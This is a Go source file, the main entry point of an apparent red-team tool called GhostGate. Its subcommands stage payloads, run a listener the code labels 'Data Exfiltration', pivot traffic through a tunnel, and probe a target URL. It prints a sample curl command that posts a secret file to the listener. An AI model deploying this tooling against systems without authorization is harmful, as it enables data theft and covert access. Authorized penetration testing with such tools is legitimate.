package main

import (
	"GhostGate/config"
	"GhostGate/internal/essentail"
	"GhostGate/internal/networking"
	"GhostGate/internal/sanitation"
	"GhostGate/internal/validation"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

func main(){
	// Checks if the init command is called
	if len(os.Args) > 1 && os.Args[1] == "init" {
		// Initalises the configuration file
		if err := config.InitializeConfig(); err != nil {
			// Logs an error
			log.Fatalf("Failed to initialize: %v", err)
		}
		// Returns nothing
		return
	}

	// Loads in the configuration
	cfg, err := config.LoadConfig()

	// CHecks for an error
	if err != nil {
		log.Printf("[!] Warning: Could not load config file, using defaults: %v", err)
		// Even if err occurs, cfg might have Viper defaults if handled in LoadConfig
	}

	// ---------------------------------------------------------
	// Flag Sets Definitions (Standardized Names & Flags)
	// ---------------------------------------------------------

	// Command: ghostgate stage
	stageCmd := flag.NewFlagSet("stage", flag.ExitOnError)
	stagePort := stageCmd.String("p", cfg.DefaultPort, "Port number to host the staging server")
	stageDir := stageCmd.String("d", cfg.DefaultPayloadsDirectory, "Directory path of the staging files")
	stageSource := stageCmd.String("s", "", "Source directory path containing payloads")

	// Command: ghostgate upload
	uploadCmd := flag.NewFlagSet("upload", flag.ExitOnError)
	uploadPort := uploadCmd.String("p", cfg.DefaultPort, "Port number to host the upload server")
	uploadPath := uploadCmd.String("u", cfg.DefaultURLPath, "URL endpoint path for uploads")
	uploadDest := uploadCmd.String("d", "uploads", "Destination folder to store uploaded files")

	// Command: ghostgate tunnel
	tunnelCmd := flag.NewFlagSet("tunnel", flag.ExitOnError)
	tunnelPort := tunnelCmd.String("p", cfg.DefaultPort, "Port number to host the local tunnel proxy")
	tunnelTarget := tunnelCmd.String("u", "", "Target URL/endpoint to forward traffic to")

	// Command: ghostgate audit
	auditCmd := flag.NewFlagSet("audit", flag.ExitOnError)
	auditTarget := auditCmd.String("u", "", "Target URL/endpoint to perform the audit against")

	// Checks if the user has provided a subcommand
	if len(os.Args) < 2 {
		// Outputs an invaild command
		fmt.Println("Unexpected input")
		// Exits the program
		os.Exit(1)
	}

	// Switch to select the command to be used
	switch os.Args[1] {
		case "stage":
			// Parse the flags starting from the 3rd argument (index 2)
			stageCmd.Parse(os.Args[2:])

			// Cleans the file path
			cleanPort := sanitation.CleanPort(*stagePort)

			// Stores the result of the port validation
			portNumberValid := validation.ValidatePort(cleanPort)

			// Checks if the number is not valid
			if !portNumberValid {
				// Logs the error
				log.Fatalf("Invalid port: %s", *stagePort)
			}

			// Sanitises the file path
			cleanPath := sanitation.CleanFilePath(*stageDir)

			// Stores the result and cleaned version of the validate port
			cleanDir, dirValid := validation.ValidateFilePath(cleanPath)

			// Checks if the directory is not valid
			if !dirValid {
				// Logs the error
				log.Fatalf("Invalid directory: %s", *stageDir)
			}

			cleanSource, sourceValid := validation.ValidateFilePath(*stageSource)

			// Checks if the directory is not valid
			if !sourceValid {
				// Logs the error
				log.Fatalf("Invalid directory: %s", *stageSource)
			}

			// Passes the flags into the function
			essentail.StagePayloadDirectory(*stagePort, cleanDir, cleanSource)
		case "upload":
			// Parse the flags
			uploadCmd.Parse(os.Args[2:])

			// Cleans the port number
			cleanPort := sanitation.CleanPort(*uploadPort)

			// Stores the result of the port validation
			portNumberValid := validation.ValidatePort(cleanPort)

			// Checks if the number is not valid
			if !portNumberValid {
				// Logs the error
				log.Fatalf("Invalid port: %s", *uploadPort)
			}

			// Checks if the url is valid 
			_, err := validation.ValidateURL(*uploadPath)

			// Checks if there is errors
			if err != nil{
				fmt.Println(err)
			} 

			// Handles the function
			http.HandleFunc(*uploadPath, essentail.UploadHandler(*uploadDest))

			// Prints information about the path
			fmt.Printf("[*] Data Exfiltration Listener active on port %s", *uploadPort)
			fmt.Printf("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://%s:%s%s\n", networking.GetOutboundIP(), *uploadPort, *uploadPath)
			
			// Listens and serves the server
			if err := http.ListenAndServe(":" + *uploadPort, nil); err != nil {
				log.Fatal(err)
			}
		case "tunnel":
			// Parses the flags
			tunnelCmd.Parse(os.Args[2:])

			// Checks if the url is valid 
			_, err := validation.ValidateURL(*tunnelTarget)

			// Checks if there is errors
			if err != nil{
				fmt.Println(err)
			} 

			// Cleans the port number
			cleanPort := sanitation.CleanPort(*tunnelPort)

			// Stores the result of the port validation
			portNumberValid := validation.ValidatePort(cleanPort)

			// Checks if the number is not valid
			if !portNumberValid {
				// Logs the error
				log.Fatalf("Invalid port: %s", *tunnelPort)
			}

			// Handles the function for tunnel
			http.HandleFunc("/", essentail.HandleTunnel(*tunnelTarget))
			// Outputs information about whats going on
			log.Println("[*] Pivot/Tunneling Server active on port", *tunnelPort)
			// Prints the tunneling messager and how to send requests through it
			fmt.Printf("[*] Tunnel Listener: curl -X GET http://%s:%s/<path>\n", 
				networking.GetOutboundIP(), 
				*tunnelPort,
			)
			// Outputs a fatal log
			log.Fatal(http.ListenAndServe(":"+*tunnelPort, nil))
		
		case "audit":
			// Parses the flag
			auditCmd.Parse(os.Args[2:])

			// Checks if the url is valid 
			_, err := validation.ValidateURL(*auditTarget)

			// Checks if there is errors
			if err != nil{
				fmt.Println(err)
			}
			
			// Ouputs the audit is starting
			fmt.Printf("[*] Launching configuration audit against: %s\n", *auditTarget)

			// Defines a client with a strict timeout so your program doesn't hang forever
			client := &http.Client{
				Timeout: 10 * time.Second,
			}

			// 3. Send the active HTTP request
			resp, err := client.Get(*auditTarget)
			
			// Catches the error
			if err != nil {
				log.Fatalf("[!] Connection failed: %v\n", err)
			}
			defer resp.Body.Close() // Clean up the connection pool when finished

			// 4. Pass the response object directly into your audit logger function
			essentail.AuditRequest(resp)
	}
}